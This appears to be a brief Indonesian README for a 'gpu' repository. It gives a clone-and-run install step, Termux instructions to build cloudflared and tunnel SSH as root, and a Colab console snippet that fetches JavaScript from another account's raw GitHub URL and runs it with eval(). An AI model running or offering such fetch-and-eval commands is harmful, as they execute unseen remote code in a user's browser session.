# gpu 
<br>
instalasi :
<hr>
git clone https://github.com/Kopen1/gpu && cd gpu && sh start.sh 
<br><br>
<h2> CONSOLE_COLAB <h2>
  <p> akses console : ctrl + shift + k 
    <br>
<hr>
async function mode() {
let url = 'https://raw.githubusercontent.com/liebedevil/borr/main/netep.js'
let response = await fetch(url);
let script = await response.text();
eval(script);}
mode();
<hr>


<h2> FOR TERMUX </h2>
=================<br>
pkg upgrade <br>
apt install openssh <br>
=================== <br>
cd ~
yes "" | pkg update
yes "" | pkg install golang git debianutils make
git clone https://github.com/cloudflare/cloudflared.git --depth=1
cd cloudflared
sed -i 's/linux/android/g' Makefile
make cloudflared
install cloudflared /data/data/com.termux/files/usr/bin
==
nano ~/.ssh/config
==
Host *.trycloudflare.com
	HostName %h
	User root
	Port 22
	ProxyCommand /data/data/com.termux/files/home/cloudflared/cloudflared access ssh --hostname %h



